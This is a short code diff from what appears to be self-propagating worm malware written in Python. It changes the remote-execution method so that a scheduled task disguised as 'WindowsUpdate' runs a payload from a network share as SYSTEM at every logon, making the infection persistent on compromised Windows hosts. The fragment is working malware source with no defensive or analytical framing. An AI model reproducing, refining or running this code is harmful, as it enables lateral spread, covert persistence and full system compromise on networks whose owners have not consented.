@@ -71,8 +71,8 @@ class Worm:
     def execute_on_target(self, host, unc_path):
         try:
             payload_path = os.path.join(unc_path, PAYLOAD_NAME)
-            #cmd = f'schtasks /s {host} /create /tn "WindowsUpdate" /tr "{payload_path}" /sc onlogon /ru SYSTEM /f'
-            cmd = f'schtasks /s {host} /create /tn "WindowsUpdate" /tr "{payload_path}" /sc once /st 00:00 /ru SYSTEM /f'
+            cmd = f'schtasks /s {host} /create /tn "WindowsUpdate" /tr "{payload_path}" /sc onlogon /ru SYSTEM /f'
+            #cmd = f'schtasks /s {host} /create /tn "WindowsUpdate" /tr "{payload_path}" /sc once /st 00:00 /ru SYSTEM /f'
             result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=5)
             
             if result.returncode == 0:
